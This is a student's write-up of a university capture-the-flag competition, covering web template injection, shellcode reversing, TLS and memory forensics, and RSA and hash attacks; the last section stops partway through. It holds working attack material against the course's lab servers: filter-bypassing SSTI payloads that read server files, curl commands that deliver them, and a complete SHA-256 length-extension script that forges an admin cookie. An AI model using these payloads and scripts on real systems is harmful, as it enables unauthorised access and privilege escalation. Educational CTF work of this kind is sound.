This document contains the write-ups for the selected challenges of the **Final CTF**.

|        Category         |      Lab Name       | Points | Captured Flag                                                                                                                                                                  | Steps                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| :---------------------: | :-----------------: | :----: | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
|           Web           |      filter.js      |   40   | `fsuCTF{way_t0_get_`<br>`around_a_filter}`                                                                                                                                     | - Read the source code and identify the SSTI vulnerability<br>- Note the filter blocks "flag", "eval(", "exec", "system(", "script"<br>- Enumerate the global scope with `Object.keys(global)` and find a `myFlag` variable<br>- Render `<%= myFlag %>` via curl to get the flag                                                                                                                                                                                                                                       |
| Reverse <br>Engineering |       loader2       |   40   | `fsuCTF{i_l0v3_`<br>`m3m0ry_m4p5}`                                                                                                                                             | - Extract the archive and read the source code  (`loader2.c`)<br>- Identify that the binary XOR-decrypts a payload with a 128-byte key and executes it as shellcode<br>- Write a Python script to replicate the XOR decryption and dump the raw shellcode<br>- Disassemble the shellcode with Capstone and identify a loop that checks each input byte against a lookup table (LUT)<br>- Extract the LUT and the target array from the shellcode<br>- Invert the LUT and map each target byte back to recover the flag |
|        Forensics        | too_late_<br>sneaky |   15   | `fsuCTF{r1ck_4stly}`                                                                                                                                                           | - Unzip the archive and identify a `.pcap` file and a TLS key log file (`snoopy`)<br>- Load the key log file into Wireshark under TLS preferences to decrypt the HTTPS/QUIC traffic<br>- Filter for HTTP/3 traffic and inspect the decrypted requests<br>- Find a YouTube search query containing the flag and URL-decode it                                                                                                                                                                                           |
|        Forensics        |      Amogus-2       |   40   | `fsuCTF{y0u_h4ve_`<br>`m1n3cr4f7_1t_c0m3s_`<br>`w1th_y0ur_0s}`                                                                                                                 | - Unzip the archive and identify a memory dump (`.mem`) and a Volatility symbol file<br>- Set up Volatility 3 with the provided symbol file and list running processes with `linux.pslist`<br>- Spot `gpicview` among the processes<br>- Use `linux.pagecache.Files` to find a cached Minecraft screenshot PNG in the page cache<br>- Recover the file from memory using `linux.pagecache.InodePages` with the inode address<br>- Open the recovered PNG to read the flag from a Minecraft sign                        |
|         Crypto          |         RSA         |   15   | `fsuCTF{The_Many_`<br>`Ways_To_Break_RSA}`                                                                                                                                     | - Read the provided `n`, `e`, and `c` values<br>- Query FactorDB with `n` and find it is already fully factored<br>- Use the factors to compute `phi(n)`, derive the private key `d`, and decrypt the ciphertext<br>- The plaintext contains a second set of RSA parameters (`n\|e\|c`), so repeat the process<br>- Query FactorDB again for the second `n`, find one factor is very small (54959)<br>- Decrypt the second layer to get the flag                                                                       |
|         Crypto          |   Hash Functions    |   15   | `fsuCTF{l3ngth_`<br>`3xt3nsi0n_is_fun}`                                                                                                                                        | - Read the Flask source code and identify the signing scheme: `SHA256(SECRET + data)`<br>- Recognize this is vulnerable to a SHA-256 length extension attack<br>- Note the secret length is 16 bytes (`os.urandom(16)`)<br>- Log in as `user` to get a valid signed cookie<br>- Use `hashpumpy` to forge a new signature appending `&role=admin` to the cookie data<br>- Send the forged cookie to the server to get the flag                                                                                          |
|         Crypto          |        !CRT         |   15   | `fsuCTF{Not_CRT_But_`<br>`Still_Vulnerable}`                                                                                                                                   | - Read the provided file and notice two RSA encryptions share the same modulus `n` but use different exponents (`e1=17`, `e2=65537`)<br>- Verify `gcd(e1, e2) = 1` to confirm the Common Modulus Attack applies<br>- Use the Extended Euclidean Algorithm to find coefficients `a`, `b` such that `a*e1 + b*e2 = 1`<br>- Calculate `m = c1^a * c2^b mod n`, handling negative exponents via modular inversec                                                                                                           |
|         Crypto          |    Jumbled Mess     |   15   | `fsuCTF{i_hope_you_`<br>`had_a_great_time_in_`<br>`our_class.all_of_the_`<br>`ta's_had_alot_of_fun_`<br>`teaching_it.maybe_we_`<br>`will_see_yall_around_`<br>`in_the_future}` | - Observe the ciphertext preserves the flag structure (braces, underscores, dots)<br>- Map the encrypted prefix `druTGD` to the known flag format `fsuCTF` to get initial letter substitutions<br>- Identify it as a monoalphabetic substitution cipher<br>- Deduce remaining mappings by frequency analysis on short repeated words (`yd`->`of`, `gsl`->`the`, etc.)<br>- Apply the full substitution mapping to decrypt the message                                                                                  |

## filter.js
The challenge gave us a web application and told us there was a `flag.txt` file in the server directory. I started by reading the source code provided.

The app was a Node.js server using the EJS templating engine. It took a `template` parameter from the URL, and if it passed some checks, it rendered it directly with `ejs.render(template)`. That means whatever I sent as input was being executed as an EJS template. This is a Server-Side Template Injection (SSTI).

Before trying anything, I looked at the checks the server does on the input:
- It only allows printable ASCII characters
- It limits input to 500 characters
- It runs a filter that blocks these patterns: `script`, `eval(`, `system(`, `exec`, `flag`

So I knew I had code execution through EJS tags, but I had the filter prblem. In EJS, `<%= expression %>` evaluates a JavaScript expression and prints the result.. I wanted to read `flag.txt`, but the word `flag` is blocked, so I needed to avoid writing it directly.

My first idea was to use Node.js's `fs` module to read the file. In Node.js you normally access it with `require('fs')`, so I tried:

```
<%= require("fs").readFileSync("fl"+"ag.txt","utf8") %>
```

I split `"flag.txt"` into `"fl"+"ag.txt"` to bypass the filter. *I sent this using curl (with `-k` to skip SSL verification since the certificate was self-signed)*:

```bash
curl -k -G "https://ctf.cs.fsu.edu:65022/" --data-urlencode 'template=<%= require("fs").readFileSync("fl"+"ag.txt","utf8") %>'
```

The server returned `ReferenceError: require is not defined`. So `require` was not available.

I then tried to reach it through `global.process.mainModule.require`, which is another way to get `require` in Node.js:

```
<%= global.process.mainModule.require("fs").readFileSync("fl"+"ag.txt","utf8") %>
```

This returned `TypeError: Cannot read properties of undefined (reading 'require')`, meaning `process.mainModule` was `undefined`. Apparently his happens in newer versions of Node.js where `mainModule` was removed.

At this point I decided to stop guessing and first figure out what was actually available in the execution context. I tried:

```
<%= Object.keys(global) %>
```

This prints all the keys in the `global` object, which is the global scope in Node.js. The server returned:

```
global,clearImmediate,setImmediate,clearInterval,clearTimeout,setInterval,setTimeout,queueMicrotask,structuredClone,atob,btoa,performance,fetch,navigator,crypto,myFlag
```

The last entry was called `myFlag`. The server had the flag stored directly as a global variable. I just had to print it:

```
<%= myFlag %>
```

```bash
curl -k -G "https://ctf.cs.fsu.edu:65022/" --data-urlencode 'template=<%= myFlag %>'
```

This returned the flag in the response HTML inside the `<pre>` tag:

```
fsuCTF{way_t0_get_around_a_filter}
```


## loader2
We were given a `.tar.gz` archive. 

The first thing I did was extract the archive to see what was inside.
```bash
tar -xzvf loader2.tar.gz
```

That gave me two files: a compiled binary called `loader2` and its source code `loader2.c`. I started by reading `loader2.c`.

Before reading the code I ran the binary with `./loader2` to see what it does. It printed `What happens next?`, waited for input, and after I typed something it printed `Incorrect.` and exited. It looked a flag checker: it reads something from stdin and tells us if it is right or wrong.

The code was obfuscated with random-looking names for everything (variables, structs, functions), but the logic was short enough to follow. I renamed things to make it more clear. The file has three main parts:
- A global array of 128 bytes that I called `key`.
- A global string literal (declared as `unsigned char[]`) with what looked like binary garbage, which I called `payload`.
- A `main` function and a `launch` function.

`main` just allocates a struct, copies `key` into one of its fields, copies `payload` into another, sets the size, and calls `launch`.

`launch` is where the interesting stuff happens:
1. It calls `mmap` to allocate a chunk of memory with read, write, and execute permissions (`PROT_READ | PROT_WRITE | PROT_EXEC`).
2. It copies the payload into that memory region.
3. It loops over every byte and XORs it with `key[i % 128]`, so the key repeats cyclically over the payload.
4. It casts the memory region to a function pointer and calls it.

So the payload is encrypted shellcode. The program decrypts it at runtime and executes it directly. I had to figure out what the decrypted shellcode does without running it.

My first step was to decrypt the payload myself. The XOR operation is easy to reverse because XOR is its own inverse: if `encrypted[i] ^ key[i % 128] = decrypted[i]`, then doing the same XOR again gives back the original. I wrote a small Python script to do this.

```python
with open("loader2.c") as f:
    src = f.read()

import re

# extract key (array of hex ints separated by commas)
m = re.search(r"fsdjklf_5894320\[\]\s*=\s*\{([^}]+)\}", src)
key = [int(x.strip(), 16) for x in m.group(1).split(",") if x.strip()]

# extract payload (C string literal with \xNN escapes, N can be 1 or 2 hex digits)
m = re.search(r'fsdjklf_5884330\[\]\s*=\s*"((?:[^"\\]|\\.)*)"', src)
raw = m.group(1)

payload = bytearray()
i = 0
while i < len(raw):
    if raw[i] == "\\" and raw[i+1] == "x":
        j = i + 2
        hexs = ""
        while j < len(raw) and raw[j] in "0123456789abcdefABCDEF" and len(hexs) < 2:
            hexs += raw[j]
            j += 1
        payload.append(int(hexs, 16))
        i = j
    else:
        payload.append(ord(raw[i]))
        i += 1

payload.append(0)  # sizeof() includes the null terminator

decrypted = bytes(b ^ key[i % 128] for i, b in enumerate(payload))

with open("shellcode.bin", "wb") as f:
    f.write(decrypted)

print("done, size:", len(decrypted))
```

After running this I had a `shellcode.bin` file with the raw decrypted bytes. Before trying to disassemble it I ran a quick search for readable strings in the binary, just to get an idea of what it might do:

```bash
strings shellcode.bin
```

That gave me two strings: `Correct.` and `Incorrect.`. So the shellcode is some kind of checker: it takes an input and tells you if it is right or wrong. That is the flag validator.

Now I needed to disassemble the shellcode to understand exactly what it checks. I wrote another small script using the `capstone` disassembly library:

```python
from capstone import Cs, CS_ARCH_X86, CS_MODE_64

with open("shellcode.bin", "rb") as f:
    code = f.read()

md = Cs(CS_ARCH_X86, CS_MODE_64)

for insn in md.disasm(code, 0x0):
    if insn.address >= 0x90:  # stop before the data section
        break
    print(f"0x{insn.address:04x}:  {insn.mnemonic}  {insn.op_str}")
```

The output was:
```
0x0000:  sub  rsp, 0x20
0x0004:  xor  eax, eax
0x0006:  xor  edi, edi
0x0008:  mov  rsi, rsp
0x000b:  mov  edx, 0x20
0x0010:  syscall
0x0012:  test rax, rax
0x0015:  js   0x5f
0x0017:  xor  ecx, ecx
0x0019:  lea  r8,  [rip + 0x90]
0x0020:  lea  r9,  [rip + 0x189]
0x0027:  cmp  ecx, 0x1a
0x002a:  jge  0x3e
0x002c:  movzx ebx, byte ptr [rsp + rcx]
0x0030:  mov  bl, byte ptr [r8 + rbx]
0x0034:  cmp  bl, byte ptr [r9 + rcx]
0x0038:  jne  0x5f
0x003a:  inc  ecx
0x003c:  jmp  0x27
0x003e:  mov  eax, 1
0x0043:  mov  edi, 1
0x0048:  lea  rsi, [rip + 0x41]
0x004f:  mov  edx, 9
0x0054:  syscall
0x0056:  mov  eax, 0x3c
0x005b:  xor  edi, edi
0x005d:  syscall
0x005f:  mov  eax, 1
0x0064:  mov  edi, 1
0x0069:  lea  rsi, [rip + 0x30]
0x0070:  mov  edx, 0xb
0x0075:  syscall
0x0077:  mov  eax, 0x3c
0x007c:  mov  edi, 1
0x0081:  syscall
```

I went through this step by step. The first part (`0x0000` to `0x0010`) is a `read` syscall. On Linux x86-64, syscall number 0 is `read(fd, buf, count)`. So:
- `eax = 0` means `read`
- `edi = 0` means stdin
- `rsi = rsp` means the buffer is on the stack
- `edx = 0x20 = 32` means it reads up to 32 bytes

After the read there is a `test rax, rax` and a `js 0x5f` which jumps to the failure path if the return value is negative (an error).

Then the main loop starts. `ecx` is used as the loop counter `i`, starting at 0. Two pointers are loaded using `lea` with RIP-relative addressing:
- `r8` is loaded as `rip + 0x90`. Since the instruction is at `0x0019` and is 7 bytes long, RIP will be `0x0020` when it executes, so `r8 = 0x0020 + 0x90 = 0xb0`. This is a lookup table (LUT) somewhere in the shellcode data.
- `r9` is loaded as `rip + 0x189`. The instruction is at `0x0020` and is 7 bytes long, so RIP = `0x0027`, and `r9 = 0x0027 + 0x189 = 0x1b0`. This is the target/expected array.

The loop condition is `cmp ecx, 0x1a` / `jge 0x3e`, so it runs while `i < 26` (0x1a = 26).

Inside the loop:

1. `movzx ebx, byte [rsp + rcx]` - takes `input[i]`, the byte we typed
2. `mov bl, [r8 + rbx]` - looks it up in the LUT: `bl = LUT[input[i]]`
3. `cmp bl, [r9 + rcx]` - compares it to `target[i]`
4. If they differ, jump to the "Incorrect." path

So the algorithm is:
```
for i in range(26):
    if LUT[ input[i] ] != target[i]:
        print("Incorrect.")
        exit
print("Correct.")
```

To find the flag I needed to reverse this. If `LUT[flag[i]] = target[i]`, then `flag[i] = LUT_inverse[target[i]]`. First I checked if the LUT was a permutation (all 256 values appear exactly once), which would mean it is easily invertible. Then I extracted both tables from the shellcode and inverted them.

The LUT starts at offset `0xb0` and is 256 bytes long (one entry per possible byte value). The target starts at offset `0x1b0` and is 26 bytes long (one per character of the flag).

```python
with open("shellcode.bin", "rb") as f:
    code = f.read()

LUT    = code[0xb0 : 0xb0 + 256]   # lookup table, 256 bytes
target = code[0x1b0 : 0x1b0 + 26]  # expected output, 26 bytes

# build the inverse: inv[y] = x such that LUT[x] = y
inv = [0] * 256
for x, y in enumerate(LUT):
    inv[y] = x

flag = bytes(inv[t] for t in target)
print(flag.decode("ascii"))
```

Running this printed the flag:
```
fsuCTF{i_l0v3_m3m0ry_m4p5}
```

I confirmed it by sending the flag to the binary:
![[Pasted image 20260422173446.png|517]]


## too_late_sneaky
The challenge gave me a zip file called `too_late_sneaky.zip`. I started by unzipping it to see what was inside:

```bash
unzip too_late_sneaky.zip
```

This extracted two files: `snoopy` and `too_late_sneaky.pcap`. I ran the `file` command on both of them to figure out what they were:

![[Pasted image 20260422173801.png]]

So I had a network capture file and a text file. I opened the `snoopy` file first to see what was in it:

![[Pasted image 20260422173932.png]]

I had never seen this format before, so I searched for what `CLIENT_HANDSHAKE_TRAFFIC_SECRET` and `CLIENT_TRAFFIC_SECRET_0` were. I found out that this is the format of a **TLS key log file**, also known as an SSLKEYLOGFILE. Browsers can export these files when you set the `SSLKEYLOGFILE` environment variable. They contain the session keys used to encrypt TLS traffic, which means they can be used to decrypt captured HTTPS traffic.

I opened the pcap in Wireshark to get a general idea of what traffic was captured. I went to `Statistics > Protocol Hierarchy` and saw that most of the traffic was TLS and QUIC (which also uses TLS encryption). There was also some DNS traffic and a few ICMP packets. Without the keys, I couldn't see what was inside the encrypted traffic. It all just showed as "Application Data".

To decrypt the traffic, I loaded the key file in Wireshark. I went to `Edit > Preferences > Protocols > TLS`, and in the field `(Pre)-Master-Secret log filename` I pointed it to the `snoopy` file.

After loading the keys, the Protocol Hierarchy changed. Now I could see **HTTP/2** and **HTTP/3** traffic that was hidden before. This confirmed that the key file worked and the encrypted traffic was now readable.

I filtered the traffic to see only the decrypted HTTP requests. Since most of the traffic was QUIC (which carries HTTP/3), I used the filter `http3` in Wireshark. I looked through the decrypted requests and checked the paths and hosts. There were requests to `accounts.google.com`, `www.google.com`, `www.youtube.com`, and `i.ytimg.com` (all normal Google/YouTube traffic).

Then I noticed one particular request in the list. It was a GET request to `www.youtube.com` with including an interesting query parameter:

![[Pasted image 20260422174326.png]]

I URL-decoded the search query (`%7B` = `{`, `%7D` = `}`) and got the flag:

```
fsuCTF{r1ck_4stly}
```


## Amogus-2
We were given a file called `Amogus.zip`. After unzipping it I got two files:
- `Amogus.mem`
- `symbols/linux-5.10.0.25-amd64.json`

Running `file` on `Amogus.mem` told me it was a 64-bit ELF core file, which is basically a memory dump. The challenge description said something about a game and a screenshot that hopefully saved before the OS froze, so I figured I needed to look inside this memory dump for an image file.

To analyze memory dumps I used Volatility 3. The `.json` file in the `symbols` folder is a symbol file that Volatility needs to understand the Linux kernel structures in this specific dump. Without it, Volatility wouldn't be able to parse anything.

First I needed to put the symbol file where Volatility could find it. I located where Volatility was installed and copied the file there:

```bash
mkdir -p /home/ende/Desktop/venv/.ctfvenv/lib/python3.13/site-packages/volatility3/symbols/linux/
cp symbols/linux-5.10.0.25-amd64.json /home/ende/Desktop/venv/.ctfvenv/lib/python3.13/site-packages/volatility3/symbols/linux/
```

Then I ran `linux.pslist` to list all the processes that were running at the time of the memory dump:

```bash
vol -f Amogus.mem linux.pslist
```

Looking through the output I noticed a few interesting processes. Most of them were standard system processes, but these caught my attention:
- `gpicview` (PID 1630) - an image viewer, started at 17:05:17
- `minecraft.AppIm` (PID 1664) - probably the game mentioned in the challenge, started at 17:06:08

The fact that an image viewer was open right before the system froze fit perfectly with the description saying "I hope the screenshot saved". So I focused on `gpicview` and tried to see what files it had open using `linux.lsof`:

```bash
vol -f Amogus.mem linux.lsof --pid 1630
```

The output didn't show any image file directly, only log files and sockets. Apparently this is because image viewers load the image into memory and then close the file descriptor, so the file isn't necessarily still open. The image data would still be somewhere in memory though.

I then ran `linux.pagecache.Files` to list all the files that Linux had cached in memory, and filtered for image files:

```bash
vol -f Amogus.mem linux.pagecache.Files | grep -iE "png|jpg|jpeg|bmp"
```

This returned A LOT of results, but one stood out immediately:

```
/run/initramfs/memory/changes/changes/home/amogos/.minecraft-pi/screenshots/2026-04-20_13.04.23.png
```

A Minecraft-Pi screenshot taken at 13:04:23 - that had to be what we were looking for. The output also gave me the inode address for this file: `0x8be5412388e0`.

The Linux page cache is where the kernel temporarily stores file contents in RAM after they've been read or written. Even though the OS froze, the file data was still sitting in memory. Volatility has a plugin called `linux.pagecache.InodePages` that can recover this data using the inode address. I created a folder for the output and ran it:

```bash
mkdir recovered
vol -f Amogus.mem -o ./recovered/ linux.pagecache.InodePages --inode 0x8be5412388e0 --dump
```

This recovered 12 memory pages and wrote them to `inode_0x8be5412388e0.dmp`. I ran `file` on it to check:

```bash
file recovered/inode_0x8be5412388e0.dmp
```

Output: `PNG image data, 840 x 480, 8-bit/color RGBA, non-interlaced`: a valid PNG. I renamed it and opened it:

```bash
cp recovered/inode_0x8be5412388e0.dmp recovered/screenshot.png
xdg-open recovered/screenshot.png
```

The image showed a Minecraft sign with the flag written on it.

![[screenshot.png|286]]

```
fsuCTF{y0u_h4ve_m1n3cr4f7_1t_c0m3s_w1th_y0ur_0s}
```


## RSA
For this challenge we are given a file named `challenge.txt` containing three large integers labeled `n2`, `e2`, and `c2`, which appear to be the public modulus, public exponent, and ciphertext of an RSA encryption scheme.

The modulus `n2` was a huge number, over 600 digits long. I knew that if the primes `p` and `q` were generated correctly, a number that size would be impossible for me to factor on my own laptop.

I thought about checking if the modulus had already been factored by someone else in **FactorDB**. I just used a simple `curl` command to ask the FactorDB API about `n2`.

```
curl -s "http://factordb.com/api?query=159242524493485743858865778913291788542376179156911627430738223167137933238433998549557484499429530847933743929255175191553523812447119524638243096446019212207738103410547440653229687962770026050345899265391997768944579894567295710366666921188598562606175512327907138344924188046759677516538386155067992628163238795371730486199154320550064495831207131456992336705170240374104727957025664726060616943101967094139518802699497839674120758993638157698979054548955788329898301191319729171868535370832435391457171736283388730155382140145368777093655734421983980525233238743873417713940603638262194235017056080327304913405218911081636980186616720271021716913546058549270076382298129033857883445431173251214860405942672078221535859138776349576379106486197515563498492951302030161776698901355046869174806027436426814761192544963861197683182939252137867440507279367647863472425461260343987533763881555669815587224856239091678636535763819223473547910916717960680772128952225919322299175018707284418434833081986434618310314124370431096423791814496812932479817896996647662213194716386275948746442529426560961013517958371018470766399813232143940643810594030079111389625954904035647685342742093046512857712225794397109049867835999824737579114279296170201807627253803704365185492617331311926409203672929836086757558699572251771904316459165284838383947116425397078428590312738966948957907852948181099934806636821135352163741740829871058381794400165886092056643545872690182621408419966004582327070747351734308828255531069425453490777690263903942625234719182255032088361196544589343"
```

The response was a JSON object. Right there, I saw that the `status` was "FF" (fully factored) and the `factors` list contained two enormous numbers. That meant someone had already factored this exact modulus and uploaded the results. This was great news because I could just use those primes to decrypt the message.

I wrote another small script to perform the decryption using the factors I got from the database.

```python
from Crypto.Util.number import long_to_bytes

# factors from FactorDB
p = 11863801815216386450774288057161348908766250661198248561037789437758863779222206709866660256945776079101903296449553022165402933665186687389677460939764142027485886910835043985266239238632908002918811809615280283441182010780383383115302698552096186127683605098572047924209399276141911789866764837180637532053562314238689383767038515337398419356202297015267381428634139297789042705790013497654008118301390364851002925177473750518940298387258586160111752260015105321501316093187020549347482438745470287821859764393775377669422281424957787707222135476362743078660101982115988423760992361212083095283068173938151766085460902131574957908283568549513733715687539369768511298834082144748695767834511088100106977955004917541380299100266661542011509856479265765941059743575377963230501500319
q = 13422554335764693062333039775868173422635743893006924753397105905441284163923641536649934659022008776670234178813579590235209470631428410058042802654516268474120349241049167956981971078361911778589672304413835624247610816865345081487984729669972922484273584608134854189506169522783076461375480687488035888196975582698066464826949924503663139329814980961364505914345550578371614934779462409900708423183223077670274188072229141068572403353017368622585540829031737323892002636187720534267722424990306953962668002538545443524824044154777723234345754878636960289091364989726296438207640298693090648908191057365255224552063714146442146665343104731207550525359012872616444157678079352003281713650378417126472569651862033275870890181390152047036035222913570569777014927478044567688706893697
e = 65537
c = 40949046512708908541676056521624379775672014036957216523844914914687999286461778840618911070628753013250748722571155268059833723094794607315802936689761267411980505375559022243575131640034667351866355114808532549893469975195355679568747533285552682356058890779307382466698715523988534681974630353668564267073969693446127818775986534509575110376127786961563075622995822804168172070295079188409207927054797653093112523752716631295910703049268175438183192643823296325362900525882803638229861784979232071880678513480220329134869506026000582838365789416978087937788738295042490150196475141294410984433237023808099103840628880611791891482429764895262357314007476457755866896367271638668405905700432019443582464169165564871267421683332164090377230998902799474801577561118097341584738533015359291149735320633606142357047462931560052321824280196150241735819426151131789737876769392555819376974858067562070856298586008153209960236791846296103259516002362762413642396507585863190354144130809270389973044612886112939656247495358686841285742333704322559979455922041643839195731613980929901715864377403794579329197496218820762360476945880891553199966878165056799267511721530919992471703213827861126715987663814366250781393479189526945614307387339991991639372658705851226890913970590330278625080582841312090819096505606928687065318637860003206008834793015730529968235094165147211517258094929136511812211645256892427693861944007651550844453401679514899723200513400497690082941473041314050801132130948303457860720506520311735158947420838296513829214068026547192710199157513858274

n = p * q
phi = (p - 1) * (q - 1)
d = pow(e, -1, phi)   # modular inverse

m = pow(c, d, n)
plaintext = long_to_bytes(m).decode()
print(plaintext)
```

When I ran this script, it printed a string that didn't look like the flag format I expected. Instead of starting with `fsuCTF{`, it was a long number followed by a pipe and two more long numbers. The output was:

```
9770636783091997533878080788232504390548857407671254482894481881981209487805023877574389258187583756964920427372759108747298107609518311940203288982397397328181922288941439662784940060988834482965687489504460483006940058310156255852932196728309072229878896279708933733293931659037790387930940328860221223416526513|65537|8746932401587504829290066743745705263616593446516210173917318369200544004805623935019321626327515541629792696080505393484701701032762358367323099022273617492408230531003578178955424225278660922891172082583653157283935186953964868160504225843698371400777392768598948646787032795738278275548001129197017246742515886
```

At first I was confused. It looked like the format `n|e|c`. I realized that the first RSA layer was actually hiding a second RSA problem. The plaintext of the first encryption wasn't the flag itself, but the parameters for a new, different RSA ciphertext.

So I took these new values:

```
n = 9770636783091997533878080788232504390548857407671254482894481881981209487805023877574389258187583756964920427372759108747298107609518311940203288982397397328181922288941439662784940060988834482965687489504460483006940058310156255852932196728309072229878896279708933733293931659037790387930940328860221223416526513
e = 65537
c = 8746932401587504829290066743745705263616593446516210173917318369200544004805623935019321626327515541629792696080505393484701701032762358367323099022273617492408230531003578178955424225278660922891172082583653157283935186953964868160504225843698371400777392768598948646787032795738278275548001129197017246742515886
```

This new modulus was smaller (about 300 digits), but still too large for me to factor with a simple script. I figured if the first modulus was in FactorDB, maybe this one was too. I used the same `curl` command with the new `n`.

```
curl -s "http://factordb.com/api?query=9770636783091997533878080788232504390548857407671254482894481881981209487805023877574389258187583756964920427372759108747298107609518311940203288982397397328181922288941439662784940060988834482965687489504460483006940058310156255852932196728309072229878896279708933733293931659037790387930940328860221223416526513"
```

The FactorDB response came back quickly. This time, one of the factors was really small!

```json
"factors":[
  ["54959", 1],
  ["177780468769300706597246689136128830410830935928078285319865388416477910584345127778423720558736217124855263512304792822782403384514243562295589238930791996364233743134726608249512182917972206244030777297703023763295184743356979855036157803604670249274530036567421782297602424699099153695135288648996910850207", 1]
]
```

The prime `p` was just `54959`, which is tiny. The other factor `q` was the large one. Having a small prime is a huge weakness because it means someone could have factored this modulus by just trying small prime numbers in a loop.

I modified my decryption script to use these new factors.

```python
from Crypto.Util.number import long_to_bytes

p = 54959
q = 177780468769300706597246689136128830410830935928078285319865388416477910584345127778423720558736217124855263512304792822782403384514243562295589238930791996364233743134726608249512182917972206244030777297703023763295184743356979855036157803604670249274530036567421782297602424699099153695135288648996910850207
e = 65537
c = 8746932401587504829290066743745705263616593446516210173917318369200544004805623935019321626327515541629792696080505393484701701032762358367323099022273617492408230531003578178955424225278660922891172082583653157283935186953964868160504225843698371400777392768598948646787032795738278275548001129197017246742515886

n = p * q
phi = (p - 1) * (q - 1)
d = pow(e, -1, phi)

m = pow(c, d, n)
flag = long_to_bytes(m).decode()
print(flag)
```

This time when I ran the script, it printed the actual flag.

```
fsuCTF{The_Many_Ways_To_Break_RSA}
```


## Hash Functions
The challenge gave us the hint "Hash functions can be pretty good security.", a server at `https://ctf.cs.fsu.edu:65030/` and a `main.py` file with the source code of the server. 

The first thing I did was opening the Python file to understand what the server was doing. It was a small Flask app with only two routes, `/` and `/login`. On `/login` the server takes a username from a form, builds a string like `username=<name>&role=user`, signs it and stores it in a cookie called `session`. On `/` it reads that cookie, verifies the signature and, if the parsed `role` is equal to `admin`, it prints the content of `flag.txt`. I needed to send a valid cookie where `role=admin`. 

The signing function looked like this:
```python
SECRET = os.urandom(16)

def sign(data: bytes) -> str:
    return hashlib.sha256(SECRET + data).hexdigest()
```

The signature is `SHA256(SECRET + data)`, where `SECRET` is 16 random bytes generated when the server starts. The token stored in the cookie has the form `data_hex|signature`. The `/login` route also blocks the strings `admin`, `&` and `=` in the username, so I could not just register as `user&role=admin`, and of course I do not know the secret, so I cannot forge a signature from scratch either. 

At this point I searched for "sha256 secret + data signature vulnerability" and the top results pointed all to the same thing: a **length extension attack**.

I read a couple of blog posts about length extension to understand what it was. What I understood is this:
- SHA-256 processes the input in 64-byte blocks. Before hashing, it appends a padding to the message so its length is a multiple of 64 bytes. The padding is one byte `0x80`, then a bunch of `0x00` bytes, and finally 8 bytes with the length of the original message in bits.
- The final hash value is actually the internal state of the algorithm after processing the last block. This means that if I know `H(secret + data)`, I can take that value as the "current state" and keep hashing more bytes on top, as if I was continuing the computation. The result will be `H(secret + data + padding + extension)`, and I will be able to compute it **without knowing the secret**.
- The only thing I need to know is the length of the secret, because the padding depends on the total length `len(secret) + len(data)`.

Since the source code was provided,  I could see that the secret is exactly 16 bytes (`os.urandom(16)`). 

Now I had to think about the parsing on the server side. The verification does this:
```python
pairs = {}
for part in data.split(b"&"):
    k, v = part.split(b"=", 1)
    try:
        pairs[k.decode()] = v.decode()
    except Exception:
        pass
```

So the server splits the data by `&` and then each part by `=`. If I append `&role=admin` to the original data, the new data will be something like `username=user&role=user<padding>&role=admin`. When the server splits by `&`, it will get three parts: `username=user`, `role=user<padding>` and `role=admin`. The middle part will fail to decode as UTF-8 because of the `0x80` byte in the padding, but the server catches that exception with `except Exception: pass` and just skips it silently. So the final dictionary will contain `role=admin`.

Before writing code I wanted to test the server manually. I tried to connect with my browser to `https://ctf.cs.fsu.edu:65030/` but it failed. Looking at the source code again I saw this line at the bottom:

```python
app.run(debug=False, host="0.0.0.0", port=3000)
```
*There is no SSL context anywhere, so the server speaks plain HTTP, not HTTPS. I changed the URL to `http://ctf.cs.fsu.edu:65030/` and it worked.* 

I opened the login page, typed `user` as username, pressed submit and I got redirected to `/` with the message "Welcome user! You are not admin." and a cookie `session` with a long hex value followed by `|` and another hex value. I opened the browser developer tools (Storage tab) and copied the cookie value. The format matched what I expected:

```
<data_in_hex>|<signature_in_hex>
```

To perform the length extension I needed a tool that does the math for me. I found `hashpumpy`, a Python library that does exactly this. I installed it with:

```
pip install hashpumpy
```

Then I wrote a small script to do the whole attack end to end, so I did not have to copy and paste values by hand:

```python
import requests
import hashpumpy

BASE = "http://ctf.cs.fsu.edu:65030"

# get a valid token by logging in as "user"
r = requests.post(f"{BASE}/login",
                  data={"username": "user"},
                  allow_redirects=False)
cookie = r.cookies.get("session")
data_hex, sig = cookie.rsplit("|", 1)
original_data = bytes.fromhex(data_hex)
print("original data:", original_data)
print("original sig :", sig)

# forge a new token with "&role=admin" appended
SECRET_LEN = 16
extension  = b"&role=admin"
new_sig, new_data = hashpumpy.hashpump(sig, original_data, extension, SECRET_LEN)
print("forged data  :", new_data)
print("forged sig   :", new_sig)

forged_token = new_data.hex() + "|" + new_sig

# send the forged cookie to /
r = requests.get(BASE, cookies={"session": forged_token})
print(r.text)
```

The script does three simple things:
1. It sends a POST to `/login` with `username=user` and extracts the `session` cookie from the response. This gives me a valid token for a normal user.
2. It calls `hashpumpy.hashpump(sig, original_data, extension, SECRET_LEN)`. This function takes the original signature, the original data, the bytes I want to append and the length of the secret, and it returns the new signature and the new data (original data + padding + extension).
3. It sends a GET to `/` with the forged cookie and prints the response.

I ran the script and got the flag:
![[Pasted image 20260422193615.png]]

```
fsuCTF{l3ngth_3xt3nsi0n_is_fun}
```


## !CRT
The challenge provides a file called `cipher.txt` and just the hint: **This problem is !CRT.**

I opened the file and found two RSA encryptions. Both shared the same modulus `n`, but each used a different public exponent (`e1 = 17` and `e2 = 65537`) and produced a different ciphertext (`c1` and `c2`). The key observation here was that the same plaintext `m` was encrypted twice under the same `n` but with two different values of `e`. That's unusual, because normally each RSA key pair has its own unique modulus.

I searched for attacks where the same modulus is reused with different exponents and found the **Common Modulus Attack**. The idea is: if `gcd(e1, e2) = 1`, then there exist two integers `a` and `b` such that `a * e1 + b * e2 = 1`. I checked this condition first:

```python
from math import gcd
print(gcd(17, 65537))
```

Since the gcd was 1, the attack was viable. 

The math behind it works like this: we know that `c1 = m^e1 mod n` and `c2 = m^e2 mod n`. If we find `a` and `b` such that `a * e1 + b * e2 = 1`, then `c1^a * c2^b = m^(a*e1) * m^(b*e2) = m^(a*e1 + b*e2) = m^1 = m (mod n)`. So we can recover `m` directly, without ever needing to factor `n` or find the private key.

